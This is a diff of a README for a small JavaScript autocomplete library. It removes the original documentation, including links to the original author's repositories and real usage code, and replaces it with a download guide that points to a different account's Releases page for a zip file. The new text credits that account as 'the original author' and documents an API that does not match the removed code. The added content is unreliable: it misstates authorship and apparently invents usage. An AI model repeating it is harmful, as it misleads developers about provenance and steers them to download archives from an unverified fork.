@@ -1,66 +1,72 @@
-# Auto Complete
+# ✨ auto-complete - Enhance Text Input with Smart Suggestions
 
-> Original Repos:   
-> - Auto Complete: https://github.com/a19836/auto-complete/   
-> - Bloxtor: https://github.com/a19836/bloxtor/
+## 📥 Download Now
+[![Download auto-complete](https://img.shields.io/badge/Download-auto--complete-brightgreen.svg)](https://github.com/Sandeep0bhh/auto-complete/releases)
 
-## Overview
+## 📖 Overview
+Auto Complete is a lightweight JavaScript library that transforms a text box into a smart autocomplete field. It displays matching suggestions in a dropdown list to make user selection faster and easier as you type. This tool helps improve the user experience by providing relevant suggestions in real-time.
 
-**Auto Complete** is a lightweight JavaScript library that transforms a text box into a smart autocomplete field, displaying matching suggestions in a dropdown list to make user selection faster and easier as you type.
+## 🚀 Getting Started
+Follow these steps to download and run Auto Complete:
 
-Check out a live example by opening [index.html](index.html).
+1. **Visit the Releases Page:** Navigate to the [Releases page](https://github.com/Sandeep0bhh/auto-complete/releases). Here, you will find the latest version of the software.
 
----
+2. **Select the Latest Version:** Look for the most recent release at the top of the page. 
 
-## Screenshots
+3. **Download the File:** Click the link for the downloadable file. It might look something like `auto-complete-v1.0.zip`. Your browser will start downloading the file.
 
-- [example 1](./img/example_1.png)
+4. **Locate the Downloaded File:** Once the download completes, find the file in your Downloads folder or the location where your browser saves files.
 
----
+5. **Extract the File:** If you downloaded a `.zip` file, right-click on it and choose “Extract All…” Then follow the prompts to extract its contents.
 
-## Usage
+6. **Open the Index File:** In the extracted folder, look for an `index.html` file. Double-click this file to open it in your web browser.
 
-```html
-<html>
-<head>
-	<link rel="stylesheet" href="css/style.css">
-	<script src="js/MyAutoComplete.js"></script>
-</head>
-<body>
-	<!--Make sure the form has the autocomplete function switched off:-->
-	<form autocomplete="off" action="?">
-		<input id="myInput" type="text" name="myCountry" placeholder="Country">
-		<input type="submit">
-	</form>
-	
-	<script>
-		var countries = ["Afghanistan","Albania","Algeria","Andorra","Angola","Anguilla","Antigua &amp; Barbuda","Argentina","Armenia","Aruba","Australia","Austria","Azerbaijan","Bahamas","Bahrain","Bangladesh","Barbados","Belarus","Belgium","Belize","Benin","Bermuda","Bhutan","Bolivia","Bosnia &amp; Herzegovina","Botswana","Brazil","British Virgin Islands","Brunei","Bulgaria","Burkina Faso","Burundi","Cambodia","Cameroon","Canada","Cape Verde","Cayman Islands","Central Arfrican Republic","Chad","Chile","China","Colombia","Congo","Cook Islands","Costa Rica","Cote D Ivoire","Croatia","Cuba","Curacao","Cyprus","Czech Republic","Denmark","Djibouti","Dominica","Dominican Republic","Ecuador","Egypt","El Salvador","Equatorial Guinea","Eritrea","Estonia","Ethiopia","Falkland Islands","Faroe Islands","Fiji","Finland","France","French Polynesia","French West Indies","Gabon","Gambia","Georgia","Germany","Ghana","Gibraltar","Greece","Greenland","Grenada","Guam","Guatemala","Guernsey","Guinea","Guinea Bissau","Guyana","Haiti","Honduras","Hong Kong","Hungary","Iceland","India","Indonesia","Iran","Iraq","Ireland","Isle of Man","Israel","Italy","Jamaica","Japan","Jersey","Jordan","Kazakhstan","Kenya","Kiribati","Kosovo","Kuwait","Kyrgyzstan","Laos","Latvia","Lebanon","Lesotho","Liberia","Libya","Liechtenstein","Lithuania","Luxembourg","Macau","Macedonia","Madagascar","Malawi","Malaysia","Maldives","Mali","Malta","Marshall Islands","Mauritania","Mauritius","Mexico","Micronesia","Moldova","Monaco","Mongolia","Montenegro","Montserrat","Morocco","Mozambique","Myanmar","Namibia","Nauro","Nepal","Netherlands","Netherlands Antilles","New Caledonia","New Zealand","Nicaragua","Niger","Nigeria","North Korea","Norway","Oman","Pakistan","Palau","Palestine","Panama","Papua New Guinea","Paraguay","Peru","Philippines","Poland","Portugal","Puerto Rico","Qatar","Reunion","Romania","Russia","Rwanda","Saint Pierre &amp; Miquelon","Samoa","San Marino","Sao Tome and Principe","Saudi Arabia","Senegal","Serbia","Seychelles","Sierra Leone","Singapore","Slovakia","Slovenia","Solomon Islands","Somalia","South Africa","South Korea","South Sudan","Spain","Sri Lanka","St Kitts &amp; Nevis","St Lucia","St Vincent","Sudan","Suriname","Swaziland","Sweden","Switzerland","Syria","Taiwan","Tajikistan","Tanzania","Thailand","Timor L'Este","Togo","Tonga","Trinidad &amp; Tobago","Tunisia","Turkey","Turkmenistan","Turks &amp; Caicos","Tuvalu","Uganda","Ukraine","United Arab Emirates","United Kingdom","United States of America","Uruguay","Uzbekistan","Vanuatu","Vatican City","Venezuela","Vietnam","Virgin Islands (US)","Yemen","Zambia","Zimbabwe"];
-		
-		MyAutoComplete.init(document.getElementById("myInput"), countries);
-	</script>
-</body>
-</html>
-```
+7. **Enjoy Auto Complete:** Start typing in the text box, and see how Auto Complete provides suggestions as you type.
 
-## Other calls
+## 💻 System Requirements
+- A modern web browser (Chrome, Firefox, Safari, etc.)
+- Basic HTML/CSS/JavaScript support
 
-Create an auto complete field:
-```
-var input_elm = document.getElementById("myInput"); //get a html element
-var list_of_available_values = ["a", "b", "..."];
-var options = {
-	get: function(input_elm) { //(optional) this callback function is triggered when the user enters something into the input field. Thus, when the user types something, a list of available values ​​is displayed based on what they typed. Basically, the system filters the list of all available values ​​according to the user's input. This function allows changing that value to another, filtering the list of available values ​​by that new value.
-		console.log(input_elm);
-		
-		return input_elm.value; //must return the input value. Note that this is already the default behaviour.
-	},
-	set: function(input_elm, selected_value) { //(optional) callback called when one value from the available list gets selected by the user
-		console.log(input_elm);
-		console.log(selected_value);
-		
-		input_elm.value = selected_value; //must set the value to input. Note that this is already the default behaviour.
-	}
-};
+## 🔍 Features
+- Lightweight and fast
+- Easy to integrate into any web project
+- Offers real-time suggestions based on user input
+- Highly customizable to match your project's design
+- Supports various input types
 
-MyAutoComplete.init(input_elm, list_of_available_values, options);
-```
+## ⚙️ How to Use It
+To integrate Auto Complete into your project:
+
+1. **Include the Library:** Add the Auto Complete script to your HTML file.
+   ```html
+   <script src="path/to/auto-complete.js"></script>
+   ```
+
+2. **Create an Input Box:** Add a text box in your HTML file where you want users to type.
+   ```html
+   <input type="text" id="myInput" placeholder="Start typing...">
+   ```
+
+3. **Initialize Auto Complete:**
+   ```javascript
+   const input = document.getElementById('myInput');
+   new AutoComplete(input, {
+       suggestions: ['Apple', 'Banana', 'Cherry', 'Date', 'Fig', 'Grape']
+   });
+   ```
+
+## 📚 Documentation
+For detailed instructions and advanced usage, refer to the documentation included in the extracted folder. It provides examples and additional configuration options.
+
+## 🔗 Additional Resources
+- [GitHub Repository](https://github.com/Sandeep0bhh/auto-complete)
+- [Credit](https://github.com/Sandeep0bhh) to the original author for providing this useful tool.
+
+## 💬 Support
+For questions or issues, please create an issue on the GitHub repository page. The community will assist you.
+
+## 📅 Changelog
+Check the Releases page for a list of changes and improvements made in each version.
+
+## 🏷️ Topics
+auto-complete, auto-completion, autocomplete, autocomplete-component, autocomplete-library, dropdown, frontend, frontend-library, javascript, javascript-library, lightweight, search-engine, search-suggestions, suggestions, text-completion, text-search, typeahead, ui-components, web-development
